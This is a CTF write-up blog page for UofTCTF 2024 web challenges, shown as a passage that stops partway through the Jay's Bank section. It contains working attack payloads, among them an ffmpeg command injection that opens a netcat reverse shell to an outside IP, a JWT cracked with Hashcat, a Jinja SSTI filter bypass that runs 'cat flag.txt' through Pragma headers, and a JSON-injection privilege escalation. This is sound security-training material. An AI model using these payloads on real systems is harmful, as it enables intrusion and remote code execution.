<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="UofTCTF 2024 Challenge Writeups" /><meta name="author" content="m0z, miasto" /><meta property="og:locale" content="en" /><meta name="description" content="Writeups" /><meta property="og:description" content="Writeups" /><link rel="canonical" href="https://ireland.re/posts/UofTCTF_2024/" /><meta property="og:url" content="https://ireland.re/posts/UofTCTF_2024/" /><meta property="og:site_name" content="Ireland.RE" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-01-17T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="UofTCTF 2024 Challenge Writeups" /><meta name="twitter:site" content="@LooseSecurity" /><meta name="twitter:creator" content="@m0z, miasto" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m0z, miasto"},"dateModified":"2024-01-17T00:00:00+00:00","datePublished":"2024-01-17T00:00:00+00:00","description":"Writeups","headline":"UofTCTF 2024 Challenge Writeups","mainEntityOfPage":{"@type":"WebPage","@id":"https://ireland.re/posts/UofTCTF_2024/"},"url":"https://ireland.re/posts/UofTCTF_2024/"}</script><title>UofTCTF 2024 Challenge Writeups | Ireland.RE</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ireland.RE"><meta name="application-name" content="Ireland.RE"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/logo.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ireland.RE</a></div><div class="site-subtitle font-italic">Ireland Without the RE</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/members/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>MEMBERS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ECSCIreland" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/LooseSecurity" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['none','none.none'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>UofTCTF 2024 Challenge Writeups</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>UofTCTF 2024 Challenge Writeups</h1><div class="post-meta text-muted"><div> By <em> <a href="https://ctftime.org/team/179144">Ireland Without the RE</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1705449600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-01-17 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2164 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><h1 id="writeups">Writeups</h1><h2 id="webvoice-changer"><span class="mr-2">web/Voice Changer</span><a href="#webvoice-changer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Sourceless web challenge.</p><p>Just a file upload with a pitch option. I intercepted the HTTP request and modified the pitch value.</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/upload</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>

------WebKitFormBoundaryHis6nSAKTnz412sw
Content-Disposition: form-data; name="pitch"

randomness
------WebKitFormBoundaryHis6nSAKTnz412sw
Content-Disposition: form-data; name="input-file"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryHis6nSAKTnz412sw--
</pre></table></code></div></div><p>The “randomness” value is reflected in our output from a ffmpeg command. I tried command injection and noticed shell errors were being printed.</p><p>I managed to get a reverse shell by passing <code class="language-plaintext highlighter-rouge">a" ||nc 54.174.18.49 3000 -e sh;</code> and found the flag located at <code class="language-plaintext highlighter-rouge">/secret.txt</code> location.</p><p><code class="language-plaintext highlighter-rouge">uoftctf{Y0UR Pitch IS 70O H!9H}</code></p><h2 id="webthe-varsity"><span class="mr-2">web/The Varsity</span><a href="#webthe-varsity" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We have a javascript app with source this time. We can identify that the flag is located in the article array as part of the last element:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">articles</span> <span class="o">=</span> <span class="p">[</span>
  <span class="p">{</span>
    <span class="dl">"</span><span class="s2">title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Pioneering the Future: UofT's Revolutionary AI Research</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">content</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">The University of Toronto continues to lead groundbreaking research in artificial intelligence, with its latest project aiming to develop algorithms that can understand emotions in text. Spearheaded by a team of international students, this initiative promises to revolutionize how machines interact with human language.</span><span class="dl">"</span>
  <span class="p">},</span>
  <span class="p">...</span>
  <span class="p">{</span>
    <span class="nl">title</span><span class="p">:</span> <span class="dl">"</span><span class="s2">UofT Hosts its 2nd Inaugural Capture the Flag Event</span><span class="dl">"</span><span class="p">,</span>
    <span class="nx">content</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Your flag is: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">FLAG</span><span class="p">,</span>
  <span class="p">},</span>
<span class="p">];</span>
</pre></table></code></div></div><p>So we just need to read the article which contains this flag. I notice when trying to read this article I get blocked by the following line:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="nx">decoded</span><span class="p">.</span><span class="nx">subscription</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">premium</span><span class="dl">"</span> <span class="o">&amp;&amp;</span> <span class="nx">issue</span> <span class="o">&gt;=</span> <span class="mi">9</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span>
          <span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
          <span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="na">message</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Please subscribe to access this issue</span><span class="dl">"</span> <span class="p">});</span>
      <span class="p">}</span>
</pre></table></code></div></div><p>This is because it has <code class="language-plaintext highlighter-rouge">id</code> of 9. We need to pass in a value which is NOT <code class="language-plaintext highlighter-rouge">&gt;= 9</code> but will read the final element of the array when it hits the following line:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">articles</span><span class="p">[</span><span class="nx">issue</span><span class="p">]);</span>
</pre></table></code></div></div><p>My initial thought was to pass in <code class="language-plaintext highlighter-rouge">-1</code> because in Python that can be used to access the last element of a list. Then I remembered that unfortunately this was written in Javascript!</p><p>But one line peaked my interest which sat after the numerical check but before the return:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nx">issue</span> <span class="o">=</span> <span class="nb">parseInt</span><span class="p">(</span><span class="nx">issue</span><span class="p">);</span>
</pre></table></code></div></div><p>Can we pass a value which is considered NOT <code class="language-plaintext highlighter-rouge">&gt;= 9</code> but when passed into <code class="language-plaintext highlighter-rouge">parseInt()</code> returns 9? Well, it turns out that any letters appended to javascript’s <code class="language-plaintext highlighter-rouge">parseInt()</code> are truncated.</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/article</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>

{"issue":"9a"}
</pre></table></code></div></div><p>And we get our flag.</p><p><code class="language-plaintext highlighter-rouge">uoftctf{w31rd_b3h4v10r_0f_parseInt()!}</code></p><h2 id="webno-code"><span class="mr-2">web/No Code</span><a href="#webno-code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This time we just get a standalone Python source file. We can see the application is running Flask and there is only one endpoint to interact with.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/execute'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">execute_code</span><span class="p">():</span>
    <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'code'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">re</span><span class="p">.</span><span class="n">match</span><span class="p">(</span><span class="s">".*[</span><span class="se">\x20</span><span class="s">-</span><span class="se">\x7E</span><span class="s">]+.*"</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"output"</span><span class="p">:</span> <span class="s">"jk lmao no code"</span><span class="p">}),</span> <span class="mi">403</span>
    <span class="n">result</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">result</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"output"</span><span class="p">:</span> <span class="n">result</span><span class="p">}),</span> <span class="mi">200</span>
</pre></table></code></div></div><p>Okay, so we obviously need to find a way to hit the eval and execute our code. At first, I assumed this was a PyJail challenge but since it was extremely strict I started to think there had to be a means to bypass the regex check.</p><p>Then I recalled that <code class="language-plaintext highlighter-rouge">re.match()</code> only matches the first line. So, by passing in a newline first we can inject our payload to be eval’d afterwards.</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/execute</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">31</span>

code=%0aopen('flag.txt').read()
</pre></table></code></div></div><p>Don’t forget your Content-Type header when creating the request! I ended up just using the open call and guessing the flag name instead of any fancy RCE approaches.</p><p><code class="language-plaintext highlighter-rouge">uoftctf{r3g3x_3p1c_f41L_XDDD}</code></p><h2 id="webguestbook"><span class="mr-2">web/Guestbook</span><a href="#webguestbook" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Someone else on the team solved this so they can write it up.</p><h2 id="webmy-first-app"><span class="mr-2">web/My First App</span><a href="#webmy-first-app" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>No source for this challenge.</p><p>With the only option being to set a username it seemed obvious this would have to be some sort of injection attack. I tried immediately sending a SSTI payload but was blocked by a client-side pattern match. I removed the client-side check and sent the payload but was greeted with the error <code class="language-plaintext highlighter-rouge">Username must be alphanumeric.</code> which seems pretty strict.</p><p>Without much else to go on, I checked the cookies and noticed it was JWT. I ran jwt_tool on this but got nothing. I also tried cracking the secret key with a basic wordlist to no avail.</p><p>So I decided to load my JWT <code class="language-plaintext highlighter-rouge">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlVTRVIifQ.01eSew74pkzoX1XDBW1l4AuU1Lw_VV59WDc86GY_mCc</code> into Hashcat and run rockyou.txt on it.</p><p>This recovered the JWT secret key <code class="language-plaintext highlighter-rouge">torontobluejays</code> pretty fast.</p><p>Next I decided to sign a username containing a SSTI payload <code class="language-plaintext highlighter-rouge">{{7*7}}</code> and got the elusive <code class="language-plaintext highlighter-rouge">49</code>. I immediately threw in a payload and hit the filter.</p><p>They seemed to be blocking a lot of different things. The most important thing was figuring out which <em>characters</em> are blocked. Firstly, there are no square brackets which means we need to use dot notation to access most attributes. We also have no underscores which means we cannot use strings such as <code class="language-plaintext highlighter-rouge">__globals__</code> or <code class="language-plaintext highlighter-rouge">__class__</code> and so on. In fact, we don’t even have quotations to instantiate strings.</p><p>I initially found a way to sneak in strings via parameters but passing any parameters at all hits an entirely separate block. I also found a way to sneak in parameters via POST form parameters but sending a POST request would not hit the Flask endpoint logic. I settled on finding a suitable HTTP header to sneak strings through.</p><p>The header could not contain an underscore though and so the most suitable seemed to be Pragma. If we send duplicate pragma headers then it becomes an array and we can access the offsets using dot notation <code class="language-plaintext highlighter-rouge">request.pragma.0</code> so I settled on using the following lipsum payload:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{{</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">"__globals__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">"__getitem__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">"__builtins__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">"__import__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">"os"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">"popen"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">"cat flag.txt"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">"read"</span><span class="p">)()}}</span>
</pre></table></code></div></div><p>Which when replaced with our pragma headers becomes:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{{</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">pragma</span><span class="p">.</span><span class="mi">0</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">pragma</span><span class="p">.</span><span class="mi">1</span><span class="p">)(</span><span class="n">request</span><span class="p">.</span><span class="n">pragma</span><span class="p">.</span><span class="mi">2</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">pragma</span><span class="p">.</span><span class="mi">1</span><span class="p">)(</span><span class="n">request</span><span class="p">.</span><span class="n">pragma</span><span class="p">.</span><span class="mi">3</span><span class="p">)(</span><span class="n">request</span><span class="p">.</span><span class="n">pragma</span><span class="p">.</span><span class="mi">4</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">pragma</span><span class="p">.</span><span class="mi">5</span><span class="p">)(</span><span class="n">request</span><span class="p">.</span><span class="n">pragma</span><span class="p">.</span><span class="mi">6</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">pragma</span><span class="p">.</span><span class="mi">7</span><span class="p">)()}}</span>
</pre></table></code></div></div><p>And our HTTP headers will include:</p><div class="language-http highlighter-rouge"><div class="code-header"> <span data-label-text="Http"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="err">Pragma: __globals__
Pragma: __getitem__
Pragma: __builtins__
Pragma: __import__
Pragma: os
Pragma: popen
Pragma: cat flag.txt
Pragma: read
</span></pre></table></code></div></div><p>And that got us the second solve on this challenge!</p><p><code class="language-plaintext highlighter-rouge">uoftctf{That_firewall_salesperson_scammed_me_:(}</code></p><h2 id="webjays-bank"><span class="mr-2">web/Jay’s Bank</span><a href="#webjays-bank" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>So we are given a javascript source with a mysql database. Firstly, we should check the routes and aside from the typical login/register we have a /profile PUT endpoint which allows us to modify our user account.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="k">await</span> <span class="nx">db</span><span class="p">.</span><span class="nx">updateData</span><span class="p">(</span>
      <span class="nx">username</span><span class="p">,</span>
      <span class="nx">db</span><span class="p">.</span><span class="nx">convert</span><span class="p">({</span>
        <span class="nx">phone</span><span class="p">,</span>
        <span class="nx">credit_card</span><span class="p">,</span>
        <span class="nx">secret_question</span><span class="p">,</span>
        <span class="nx">secret_answer</span><span class="p">,</span>
        <span class="na">role</span><span class="p">:</span> <span class="dl">"</span><span class="s2">user</span><span class="dl">"</span><span class="p">,</span>
      <span class="p">})</span>
    <span class="p">);</span>
</pre></table></code></div></div><p>It will then update our data in the database. Notice that inside of the call to <code class="language-plaintext highlighter-rouge">db.updateData()</code> there is a call to <code class="language-plaintext highlighter-rouge">db.convert()</code> so let’s pull up the source for that:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nx">convert</span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`{</span><span class="p">${</span><span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">o</span><span class="p">).</span><span class="nx">map</span><span class="p">(([</span><span class="nx">k</span><span class="p">,</span> <span class="nx">v</span><span class="p">])</span> <span class="o">=&gt;</span> 
      <span class="s2">`"</span><span class="p">${</span><span class="nx">k</span><span class="p">}</span><span class="s2">": </span><span class="p">${</span><span class="k">typeof</span> <span class="nx">v</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">object</span><span class="dl">"</span> <span class="o">&amp;&amp;</span> <span class="nx">v</span> <span class="o">!==</span> <span class="kc">null</span> <span class="p">?</span> <span class="nx">convert</span><span class="p">(</span><span class="nx">v</span><span class="p">)</span> <span class="p">:</span> <span class="s2">`"</span><span class="p">${</span><span class="nx">v</span><span class="p">}</span><span class="s2">"`</span><span class="p">}</span><span class="s2">`</span>
    <span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">, </span><span class="dl">"</span><span class="p">)}</span><span class="s2">}`</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">());</span>
    <span class="k">return</span> <span class="s2">`{</span><span class="p">${</span><span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">o</span><span class="p">).</span><span class="nx">map</span><span class="p">(([</span><span class="nx">k</span><span class="p">,</span> <span class="nx">v</span><span class="p">])</span> <span class="o">=&gt;</span> 
      <span class="s2">`"</span><span class="p">${</span><span class="nx">k</span><span class="p">}</span><span class="s2">": </span><span class="p">${</span><span class="k">typeof</span> <span class="nx">v</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">object</span><span class="dl">"</span> <span class="o">&amp;&amp;</span> <span class="nx">v</span> <span class="o">!==</span> <span class="kc">null</span> <span class="p">?</span> <span class="nx">convert</span><span class="p">(</span><span class="nx">v</span><span class="p">)</span> <span class="p">:</span> <span class="s2">`"</span><span class="p">${</span><span class="nx">v</span><span class="p">}</span><span class="s2">"`</span><span class="p">}</span><span class="s2">`</span>
    <span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">, </span><span class="dl">"</span><span class="p">)}</span><span class="s2">}`</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">();</span>
  <span class="p">}</span>
</pre></table></code></div></div><p>Immediately I guessed this would be prototype pollution as it is a javascript application (where such attacks are common) and we are seeing some references to <code class="language-plaintext highlighter-rouge">Object</code> but after further checks I didn’t really see any potential to overwrite that. Let’s just analyze what this method does.</p><p>It takes an object <code class="language-plaintext highlighter-rouge">o</code> and recursively creates a string representation of this object. Normally I would expect just a call to <code class="language-plaintext highlighter-rouge">JSON.stringify</code> so this looked very suspicious. I noticed that if a value contains a quotation (<code class="language-plaintext highlighter-rouge">"</code>) then it will break out of the value and allow us to add additional parameters. Normally, a call to update our profile with a <code class="language-plaintext highlighter-rouge">secret_answer</code> set to <code class="language-plaintext highlighter-rouge">abc</code> will result in the following object being saved:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"phone"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1111111111"</span><span class="p">,</span><span class="w"> </span><span class="nl">"credit_card"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1111111111111111"</span><span class="p">,</span><span class="w"> </span><span class="nl">"secret_question"</span><span class="p">:</span><span class="w"> </span><span class="s2">"aaa"</span><span class="p">,</span><span class="w"> </span><span class="nl">"secret_answer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"abc"</span><span class="p">,</span><span class="w"> </span><span class="nl">"role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"user"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>But if we instead set our <code class="language-plaintext highlighter-rouge">secret_answer</code>to <code class="language-plaintext highlighter-rouge">abc", "role": "admin</code> then it will become:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"phone"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1111111111"</span><span class="p">,</span><span class="w"> </span><span class="nl">"credit_card"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1111111111111111"</span><span class="p">,</span><span class="w"> </span><span class="nl">"secret_question"</span><span class="p">:</span><span class="w"> </span><span class="s2">"aaa"</span><span class="p">,</span><span class="w"> </span><span class="nl">"secret_answer"</span><span class="p">:</span><span class="w"> </span><span class="s2">"a"</span><span class="p">,</span><span class="w"> </span><span class="nl">"role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">,</span><span class="w"> </span><span class="nl">"role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"user"</span><span class="p">}</span><span class="w">
